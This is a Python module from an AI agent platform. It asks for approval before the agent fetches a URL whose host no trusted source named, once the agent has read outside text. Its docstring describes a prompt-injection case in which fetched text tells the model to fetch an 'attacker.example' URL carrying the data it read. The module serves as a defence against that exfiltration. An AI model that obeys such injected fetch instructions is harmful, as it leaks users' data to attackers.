"""A fetch after outside text asks -- narrowly (2026-11-11, the owner's decision).

``read_url``, ``crawl_site`` and ``web_search`` are read tier: no card. Once a
turn has read text from outside -- a web page, search results, a mail, a
document, an MCP resource: any tool output that reached the model inside a
data fence (``prompt_fence.fence_untrusted``) -- that text can tell the model
to fetch ``https://attacker.example/?d=<what it read>``, and the fetch sends
the data out in its URL.

So after outside text, a call that fetches a URL asks for approval, ONLY when
the URL's host was named neither in the user's own message (the latest user
message; a swarm task's text) nor in a search result returned earlier in the
same turn, and is not this site (``KAZMA_PUBLIC_URL``). Everything else is
as before: a research turn that reads what it searched for stays card-free.
YOLO and standing grants skip it like any other card; it is an ordinary
one-time card whose note says why (``safety.card_notes``, ``outside_fetch``).

This module is the one decision, asked by both chokes:

* the chat graph's approval split (``agent/graph_tool_worker.py``), with the
  turn's :class:`OutsideText` in the declared ``SupervisorState.outside_text``
  (kept across an approval pause, reset on a fresh turn by the supervisor);
* ``LocalToolRegistry.execute`` for a swarm task or the IDE: the task binds a
  tracker (:func:`outside_text_scope`), the registry asks before the bus check
  and records each result after it ran.

:data:`FETCH_URL_FIELDS` names every tool that fetches a URL argument, and
:data:`NOT_FETCHES` every registered tool with a URL-like parameter that
fetches nothing on its own; ``tests/test_outside_text_fetch.py`` fails on a
registered tool in neither.
"""

from __future__ import annotations

import contextlib
import contextvars
import os
import re
from collections.abc import Iterator
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlsplit

__all__ = [
    "FETCH_URL_FIELDS",
    "NOT_FETCHES",
    "SEARCH_TOOLS",
    "OutsideText",
    "bound_tracker",
    "fetch_needs_card",
    "outside_text_scope",
    "record_registry_result",
    "registry_card_host",
]

#: Tool -> the arguments that hold the URL it fetches.
FETCH_URL_FIELDS: dict[str, tuple[str, ...]] = {
    "read_url": ("url",),
    "read_url_to_file": ("url",),
    "crawl_page": ("url",),
    "crawl_site": ("start_url",),
    "knowledge_ingest_url": ("url",),
    "knowledge_ingest_site": ("seed_url",),
    # A local path, or an http(s) URL it downloads.
    "analyze_image": ("image_path",),
    "browser_navigate": ("url",),
    "computer_use": ("url",),
}

#: Registered tools with a URL-like parameter that fetch nothing themselves.
NOT_FETCHES: dict[str, str] = {
    "knowledge_create_library": "stores the seed URL; knowledge_ingest_* fetch it",
    "mcp_read_resource": "reads a resource the named MCP server serves, by its URI",
    "inspect_db_schema": "opens a database the operator's tools may reach (database_client's own rules)",
    "execute_db_query": "opens a database the operator's tools may reach (database_client's own rules)",
    "install_agent_skill": "danger tier: always asks, from GitHub or a local folder",
    "analyze_local_image": "reads a local image file",
    "convert_document": "converts a local file",
    "generate_pdf": "renders local content and images",
    "document_search": "searches a Knowledge library already stored",
    # The browser's other tools act on the page browser_navigate opened (each
    # of click, form and script is danger tier: it asks anyway).
    "browser_click": "acts on the open page; danger tier",
    "browser_fill_form": "acts on the open page; danger tier",
    "browser_eval_js": "acts on the open page; danger tier",
    "browser_extract_text": "reads the open page",
    "browser_screenshot": "captures the open page",
    "x_download_media": "downloads a post's media from X's own media hosts, by post id",
}

#: Tools whose results are search results: their addresses are seen.
SEARCH_TOOLS = frozenset({"web_search", "web_search_duckduckgo"})

#: An MCP tool's argument names that hold an address it fetches.
_MCP_URL_ARGUMENTS = frozenset({"url", "uri", "href", "link", "endpoint", "address"})

_URL_IN_TEXT = re.compile(r"https?://[^\s<>\"'()\[\]]+", re.I)
# A bare host: labels of letters, digits and hyphens, a letter TLD.
_BARE_HOST = re.compile(
    r"(?<![\w@./-])((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24})(?=[/:\s,;!?)\]]|$|\.(?:\s|$))",
    re.I,
)
#: Hosts kept per turn (search results).
_MAX_HOSTS = 500


def _normal(host: str) -> str:
    host = (host or "").strip().lower().rstrip(".")
    return host[4:] if host.startswith("www.") else host


def _host_of(value: str) -> str:
    text = (value or "").strip()
    if not text:
        return ""
    if "://" not in text:
        if not _BARE_HOST.match(text):
            return ""
        text = "https://" + text
    try:
        return _normal(urlsplit(text).hostname or "")
    except ValueError:
        return ""


def _named_hosts(text: str | None) -> set[str]:
    """The hosts a message names: its URLs' hosts and bare host names."""
    body = str(text or "")
    hosts = {_host_of(m.group(0)) for m in _URL_IN_TEXT.finditer(body)}
    hosts |= {_normal(m.group(1)) for m in _BARE_HOST.finditer(body)}
    hosts.discard("")
    return hosts


def _own_hosts() -> set[str]:
    """This site: the install's public address."""
    host = _host_of(os.environ.get("KAZMA_PUBLIC_URL") or "")
    return {host} if host else set()


def _fetch_hosts(tool: str, args: Any) -> list[str]:
    """The URLs a call fetches, as written (``[]`` for a call that fetches none)."""
    if not isinstance(args, dict):
        return []
    if tool.startswith("mcp__"):
        names = [k for k in args if str(k).lower() in _MCP_URL_ARGUMENTS]
    else:
        names = list(FETCH_URL_FIELDS.get(tool, ()))
    out: list[str] = []
    for name in names:
        value = args.get(name)
        if not isinstance(value, str) or not value.strip():
            continue
        text = value.strip()
        if tool == "analyze_image" and not text.lower().startswith(("http://", "https://")):
            continue  # a local file
        if "://" in text or _BARE_HOST.match(text):
            out.append(text)
    return out


def _covered(host: str, allowed: set[str]) -> bool:
    return any(host == a or host.endswith("." + a) for a in allowed if a)


def _result_is_outside_text(content: Any) -> bool:
    """Whether a tool's result carried outside text: a data fence, which only
    the fence helpers write (a fetched page, a mail, an MCP resource...)."""
    from kazma_core.safety.prompt_fence import holds_fence

    return holds_fence(str(content or ""))


def _search_result_hosts(content: Any) -> set[str]:
    """The hosts of a search tool's result links."""
    from kazma_core.safety.prompt_fence import observation_text
    from kazma_core.web_acquire.serp import extract_urls_from_search

    text = observation_text(str(content or ""))
    return {h for h in (_host_of(u) for u in extract_urls_from_search(text)) if h}


@dataclass
class OutsideText:
    """What a turn (or a swarm task) has read: outside text or not, and the
    hosts of its search results. ``as_state`` / ``from_state`` are the
    checkpointed form (``SupervisorState.outside_text``)."""

    read: bool = False
    hosts: set[str] = field(default_factory=set)

    @classmethod
    def from_state(cls, value: Any) -> OutsideText:
        if not isinstance(value, dict):
            return cls()
        hosts = value.get("hosts") or []
        return cls(read=bool(value.get("read")),
                   hosts={_normal(str(h)) for h in hosts if str(h).strip()})

    def as_state(self) -> dict[str, Any]:
        return {"read": self.read, "hosts": sorted(self.hosts)[:_MAX_HOSTS]}

    def record(self, tool: str, content: Any, *, is_error: bool = False) -> None:
        """Take one finished call's result into account: any data fence is
        outside text read (an error page quoted whole too); only a search that
        answered names its hosts."""
        if _result_is_outside_text(content):
            self.read = True
        if is_error:
            return
        if tool in SEARCH_TOOLS:
            self.hosts |= _search_result_hosts(content)
            if len(self.hosts) > _MAX_HOSTS:
                self.hosts = set(sorted(self.hosts)[:_MAX_HOSTS])


def fetch_needs_card(tool: str, args: Any, seen: OutsideText, user_text: str | None) -> str:
    """The host to name on a card when this call must ask; ``""`` when it
    need not: no outside text yet, a call that fetches nothing, or every host
    it fetches named by the user, a search result or this site.

    *user_text* is the user's latest message (a swarm task's text). What it
    quotes inside a data fence -- an attached document's text, an earlier
    worker's output -- is outside text: it counts as read, and the hosts it
    names are not the user's.
    """
    from kazma_core.safety.prompt_fence import outside_fences

    if not (seen.read or _result_is_outside_text(user_text)):
        return ""
    targets = _fetch_hosts(tool, args)
    if not targets:
        return ""
    allowed = _named_hosts(outside_fences(user_text)) | seen.hosts | _own_hosts()
    for target in targets:
        host = _host_of(target)
        if not host:
            return target[:200]  # an address with no host the rules can read asks
        if not _covered(host, allowed):
            return host
    return ""


# ── a swarm task's or an IDE call's turn (the registry path) ───────────────


@dataclass
class _Tracker:
    task_text: str
    seen: OutsideText = field(default_factory=OutsideText)


_TRACKER: contextvars.ContextVar[_Tracker | None] = contextvars.ContextVar(
    "kazma_outside_text_tracker", default=None,
)


@contextlib.contextmanager
def outside_text_scope(task_text: str | None) -> Iterator[None]:
    """Bind a fresh tracker for one swarm dispatch: its prompt is the user's
    message (the outside text it quotes inside a fence -- an earlier worker's
    output -- counts as read; ``fetch_needs_card``)."""
    token = _TRACKER.set(_Tracker(task_text=str(task_text or "")))
    try:
        yield
    finally:
        _TRACKER.reset(token)


def bound_tracker() -> _Tracker | None:
    """The tracker of the task this call runs in, or None (none bound)."""
    return _TRACKER.get()


def registry_card_host(tool: str, args: Any) -> str:
    """For ``LocalToolRegistry.execute``: the host to name on the bus card
    when this call must ask, else ``""`` (no task bound, or no need)."""
    tracker = bound_tracker()
    if tracker is None:
        return ""
    return fetch_needs_card(tool, args, tracker.seen, tracker.task_text)


def record_registry_result(tool: str, payload: Any) -> None:
    """For ``LocalToolRegistry.execute``: take a finished call into the bound
    task's account (none bound: nothing to do)."""
    tracker = bound_tracker()
    if tracker is None or not isinstance(payload, dict):
        return
    tracker.seen.record(tool, payload.get("content"), is_error=bool(payload.get("is_error")))
